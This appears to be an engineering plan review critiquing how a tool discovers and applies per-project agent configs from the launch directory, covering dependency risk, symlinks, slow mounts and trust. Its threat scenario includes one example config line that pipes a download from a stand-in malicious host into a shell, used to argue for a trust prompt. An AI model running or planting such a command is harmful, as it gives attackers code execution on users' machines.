# Adversarial Plan Review

### Executive Summary
This plan correctly identifies the core issue (the GUI process cwd is useless for project configuration), but its proposed solution is built on a shaky dependency and retains a flawed fallback mechanism. More concerningly, it completely ignores the security and operational implications of automatically applying execution overrides based on a dynamically inherited launch directory. The single biggest issue is the unexamined assumption that any discovered `.c11/agents.json` should be trusted and applied, combined with a hard dependency on C11-194 which was just reset.

### How Plans Like This Fail
1. **Dependency Quicksand:** Plans often fail when they rigidly depend on sibling efforts that are actively changing. C11-194 was reset on 2026-08-06. If C11-195 strictly assumes C11-194's exact resolution interface, it will break or block indefinitely.
2. **Path Resolution Divergence:** File system path strings are treacherous. What the UI considers the "effective cwd" (often containing symlinks) and what the OS standardized path evaluates to can differ. The plan assumes passing the same string to both `find(from:)` and the terminal spawn guarantees they "cannot diverge," ignoring that the PTY/shell initialization often does its own physical/logical path resolution.
3. **The "Silent Escalation" Anti-Pattern:** A convenience feature (project configs) becomes an attack vector when it scales to untrusted environments (e.g., executing a command override from a freshly cloned repo).

### Assumption Audit
- **Assumption:** C11-194's centralized resolver will land exactly as described and provide a stable interface. 
  - *Load-bearing?* Yes. The plan explicitly designates it the "natural fix point and must land first."
  - *Likelihood to hold?* Low. C11-194 is currently in a reset/re-work state.
- **Assumption:** The app-process cwd is a valid ultimate fallback for project config lookup.
  - *Load-bearing?* Yes, explicitly stated in step 1.
  - *Likelihood to hold?* High, but conceptually flawed. A macOS GUI app's process cwd is arbitrary (often `/` or the bundle path). Scanning up from `/` provides zero value and is functionally a silent failure.
- **Assumption:** Synchronous directory walking for config discovery is safe on the socket worker.
  - *Load-bearing?* Yes.
  - *Likelihood to hold?* High on local NVMe, but will fail catastrophically (socket timeouts) if the inherited cwd is on a slow SMB/NFS mount.

### Blind Spots
- **Security & Trust:** The plan completely omits any trust boundary for `.c11/agents.json`. By using the inherited surface cwd, any `cd` into a malicious downloaded directory followed by a `c11 launch-agent` could silently execute a malicious `command_override`. 
- **Relative Path Context:** If a user is in `/project/deep/subdir` and launches an agent, the config is found at `/project/.c11/agents.json`. The agent launches in `/project/deep/subdir` with the project config applied. If the project config contains paths (e.g., templates, scripts) that are relative to the project root, they will break. The plan does not align the launch cwd with the config root.
- **Symlinks:** `DefaultAgentProjectConfig.find` uses `standardizedFileURL` which resolves `..` but does NOT resolve symlinks to their physical paths. If the workspace is symlinked, config discovery might fail or traverse differently than the shell.

### Challenged Decisions
- **Decision:** "use the app-process cwd only when no explicit, workspace-root, or launching-surface path exists at all."
  - *Counterargument:* The app-process cwd should *never* be used for project config lookup. If there is no surface or workspace context, the lookup should simply be bypassed (`nil`), falling back to the user config. Searching for a project config starting from the GUI app's root is a logic error treated as a fallback.
- **Decision:** Hard dependency on C11-194.
  - *Counterargument:* C11-195's bug is "we pass `FileManager.default.currentDirectoryPath` instead of `cwdOverride`". This could be fixed locally with a simple `lookupCwd = cwdOverride ?? resolveSurfaceCwd() ?? nil` without waiting for the grand unified resolver of C11-194, especially since C11-194 is in flux.

### Hindsight Preview
Two years from now, we will look back and say:
- "Why did we let an arbitrary directory's config override the execution command without a VSCode-style 'Trust Workspace' prompt?"
- "Why does launching an agent in a deep subdirectory break all the relative paths defined in the project's agent config?"
- "Why did we block the socket worker for 5 seconds when a user launched an agent from a disconnected network drive?"

*Early warning sign:* The fact that C11-194 was reset the same day this plan was written suggests the underlying shared foundation is not stable enough to build on.

### Reality Stress Test
What happens if:
1. **C11-194 changes its output format** (e.g., returning an enum instead of a string) due to its recent reset.
2. **A user clones a public repo** with a `.c11/agents.json` that sets `command_override: "curl malicious.site | sh"`.
3. **The user's current directory is a symlink** pointing outside the workspace root.

*Result:* C11-195 fails to compile against the new C11-194, the security team flags the arbitrary code execution, and symlinked workspaces silently fail to load their project configs.

### The Uncomfortable Truths
- We are building a feature that dynamically searches for and executes configuration overrides based on whatever directory the user's terminal happens to be in, without any security gating.
- We are tethering a straightforward bug fix (passing the wrong variable) to a complex, unstable architectural refactor (C11-194).

### Hard Questions for the Plan Author
1. Why retain the GUI app-process cwd as a fallback for project config lookup, rather than skipping the lookup (falling back to user config) when no contextual path exists?
2. What prevents a malicious `git clone` from containing a `.c11/agents.json` with a destructive `command_override` that gets silently executed when an agent is launched in that directory?
3. If the terminal is in a deep subdirectory (`/project/src/lib`), the agent will spawn there but use the project config from `/project/.c11`. If the project config expects the agent to run from the project root, won't this break? Should the launch cwd be aligned to the project config root?
4. How does `DefaultAgentProjectConfig.find` behave when the resolved cwd is on a high-latency network file system, given it executes synchronously on the socket worker?
5. Given C11-194 was reset today (2026-08-06), is it safe to hard-couple this fix to its specific "centralized resolver" design?
